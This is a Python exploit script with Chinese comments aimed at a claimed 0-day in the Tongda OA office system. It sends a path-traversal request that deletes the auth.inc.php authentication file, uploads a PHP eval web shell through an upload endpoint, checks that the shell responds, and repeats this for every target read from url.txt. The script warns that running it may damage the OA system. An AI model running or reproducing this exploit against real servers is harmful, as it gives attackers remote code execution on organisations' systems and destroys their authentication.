import requests
#by Tommy，在原作者上修改而来，2020-8-19，通达OA 0 day漏洞利用
import sys
version = sys.version_info
if version < (3, 0):
    print('The current version is not supported, you need to use python3')
    sys.exit()
     
def exploit(target):
    try:
        target=target
        payload='<?php eval($_POST["admin"]);?>'#可自行修改
        print(target,"[*]删除auth.inc.php...")
 
        url=target+"/module/appbuilder/assets/print.php?guid=../../../webroot/inc/auth.inc.php"#删除auth.inc.php请求
        requests.get(url=url,verify=False,timeout=10)
        print(target,"[*]正在检查文件是否已删除...")
        url=target+"/inc/auth.inc.php"
        page=requests.get(url=url,verify=False,timeout=10).text
        #print(page)
        if 'No input file specified.' not in page:
            print(target,"[-]无法删除auth.inc.php文件")
            return 0
        print(target,"[+]删除auth.inc.php成功")
        print(target,"[*]开始上传payload...")
        url=target+"/general/data_center/utils/upload.php?action=upload&filetype=nmsl&repkid=/.<>./.<>./.<>./"
        files = {'FILE1': ('admin1.php', payload)}
        requests.post(url=url,files=files,verify=False,timeout=10)
        url=target+"/_admin1.php"
        page=requests.get(url=url,verify=False,timeout=10).text
        if 'No input file specified.' not in page:
            print("[+]************************文件已存在，上传成功************************")
           # if '8a8127bc83b94ad01414a7a3ea4b8' in page:#如果执行过md5函数，才确认漏洞存在，减少误报
            print(target,"************************代码执行成功，存在漏洞************************")
            print(target,"[+]URL:",url)
        else:
            print(target,"[-]文件上传失败")
    except Exception as e:
        print(target,e)
urls='url.txt'
print("[*]警告：利用此漏洞，会删除auth.inc.php，这可能会损坏OA系统")
input("按Enter继续")
for url in open(urls,'r',encoding='utf-8').read().split('\n'):
    url=url.split()
    exploit(url[0])
